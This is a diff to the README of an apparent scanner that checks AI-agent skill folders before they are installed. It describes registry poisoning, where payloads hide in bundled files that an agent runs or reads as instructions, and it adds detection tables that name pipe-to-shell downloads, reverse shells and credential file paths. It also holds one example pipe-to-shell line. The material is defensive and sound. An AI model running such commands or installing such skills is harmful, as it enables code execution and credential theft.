@@ -79,10 +79,11 @@ Point it at whichever folder your tool reads:
 
 | Your tool | Folder to check |
 | :--- | :--- |
+| Most agents (shared folder) | `.agents/skills` |
 | Claude Code | `.claude/skills` |
-| Cursor | `.cursor/skills` |
-| GitHub Copilot (VS Code) | `.github/skills` |
-| OpenAI Codex | `.codex/skills` |
+| Cursor | `.cursor/skills` (also reads `.agents/skills`) |
+| GitHub Copilot (VS Code) | `.github/skills` (also reads `.agents/skills`) |
+| OpenAI Codex | `.agents/skills` |
 | Google Antigravity | `.agents/skills` |
 | Roo Code | `.roo/skills` |
 | One downloaded skill | the skill's own folder |
@@ -93,6 +94,38 @@ before you install something:
 ```bash
 node scripts/check-skills.js ./some-downloaded-skill
 ```
+
+### It checks the folder, not just `SKILL.md`
+
+This is the part most people get wrong, so it is worth being blunt about.
+
+A skill is a **folder**. A registry listing shows you one file out of it:
+
+```text
+  what you were shown              what you installed
+  ───────────────────              ──────────────────
+                                   csv-tidy/
+  ┌────────────────────┐             ├── SKILL.md       ← the page you read
+  │ SKILL.md           │             ├── scripts/
+  │ "Tidy CSV files"   │             │   └── setup.sh   ← runs as you
+  │ reads fine ✓       │             ├── references/
+  └────────────────────┘             │   └── rules.md   ← the model reads this
+                                     │                     as instructions
+                                     └── assets/
+                                         └── data.bin  ← nobody can read this
+```
+
+Reviewing only `SKILL.md` is how the 2026 registry poisoning campaigns worked:
+the description was professional, the body was clean, and the payload was in a
+file the listing never displayed. So the gate reads **every file in the
+folder** — bundled scripts, reference documents, data files — and reports:
+
+- invisible characters anywhere in the package, not only in `SKILL.md`
+- commands worth a second look (see the table below)
+- which files ship with the skill, and which of them `SKILL.md` never mentions
+
+Pass `--file-only` if you genuinely want the old behaviour of checking one
+file. It is faster, and it reviews the page instead of the package.
 
 ### What the exit code means
 
@@ -209,6 +242,48 @@ say so in `compatibility` so your teammates are not surprised.
 | `<` or `>` in a frontmatter value | warning | Frontmatter is pasted into the agent's prompt, which for several models is a tag-structured document. A `<` can be read as opening a tag. Write `under 300 tokens`, not `<300 tokens` |
 | Emoji joiners (`U+200D`, `U+FE0F`) | **ignored** | 👩‍💻 and ⚠️ are built from these. A gate that fires on emoji is a gate people switch off |
 
+### Risky commands — in `SKILL.md` and in every bundled file
+
+Every fenced block in a `SKILL.md` is a command an agent may run, so these
+rules apply to the body as well as to bundled scripts.
+
+| What the gate finds | Level | Why |
+| :--- | :--- | :--- |
+| A download piped into a shell — `curl … \| sh`, `iwr … \| iex` | **error** | The script runs before anyone reads it. There is no safe version of this |
+| A reverse shell — `/dev/tcp/…`, `nc -e` | **error** | No skill has an honest reason to open a shell to a remote machine |
+| A path where credentials live — `~/.ssh/`, `~/.aws/credentials`, `.npmrc` | warning | Might be a security guide explaining the risk, might be the attack. A human decides |
+| An outbound POST — `curl -d …`, `Invoke-RestMethod -Method Post` | warning | Normal for a skill that calls an API; it is also how data leaves. Check the host |
+| An install with no version — `npx some-tool`, `pip install some-tool` | warning | The package can change after you reviewed the skill. This is the rug-pull shape |
+| "Download the latest instructions from …" | warning | Instructions fetched at run time can change after you approved them |
+
+Both spellings of pipe-to-shell are checked, so a Windows-only attack is not
+invisible to a reviewer working on macOS.
+
+**Quoting an attack without failing your own build.** A document that teaches
+people to recognise `curl … \| sh` has to be able to write it. Put a marker on
+the line, or the line above it:
+
+```markdown
+<!-- check-skills-allow: pipe-to-shell -->
+Never run something like `curl https://example.com/i.sh | sh`.
+```
+
+It works in any comment syntax (`<!-- -->`, `#`, `//`), names one rule at a
+time, and is visible in the rendered page on purpose — silencing a check
+should not be something you can do quietly. This repo's own Skill Review skill
+uses it, which is why it can describe these attacks and still pass its own gate.
+
+### Package structure — these are warnings
+
+| What the gate finds | Level | Why |
+| :--- | :--- | :--- |
+| A bundled script (`.sh`, `.ps1`, `.py`, `.js`) | warning | It runs with all of your permissions. Read it like a dependency |
+| A file `SKILL.md` never mentions | warning | Dead weight, or a payload nobody was pointed at |
+| A compiled binary shipped as code (`.so`, `.exe`, `.dll`) | **error** | Nobody can review a binary by reading it. Ask for source |
+| A non-code binary, such as an image | warning | Confirm it is what its name says |
+| `node_modules/` or a checked-out repo inside the skill | warning | A skill should declare a dependency so you can pin it, not smuggle a copy |
+| More files than the scan limit | warning | Says plainly that it stopped looking, instead of reporting a clean pass |
+
 ### Quality — these are warnings
 
 | Check | Why it matters |
@@ -309,10 +384,17 @@ Then `npm run lint:skills` works identically on macOS, Windows and Linux.
 
 Being honest about the edges is what makes the green tick worth anything.
 
-- **It reads one file.** If a skill ships a `scripts/` folder, those files need
-  the same review you would give any dependency. The gate does not read them.
+- **It reads text, and only what is in the folder.** It does not follow a
+  symlink out of the folder, and it cannot review a compiled binary — it tells
+  you one is there and stops.
 - **It does not run the skill.** A skill can behave differently from what it
   says. The gate checks the text, not the behaviour.
+- **It does not audit what a skill installs.** If a skill tells you to install
+  a package, the gate can say the version is unpinned. It cannot tell you what
+  is inside that package.
+- **Pattern matching can be evaded.** A payload split across two files, or
+  built up from pieces at run time, will not match a pattern. The gate raises
+  the cost of an attack; it does not end it.
 - **It cannot tell hostile from odd.** An instruction to read `~/.ssh/` is a
   finding whatever the reason. A human decides what to do about it.
 - **It does not check links.** A URL in a skill can point anywhere, and what it
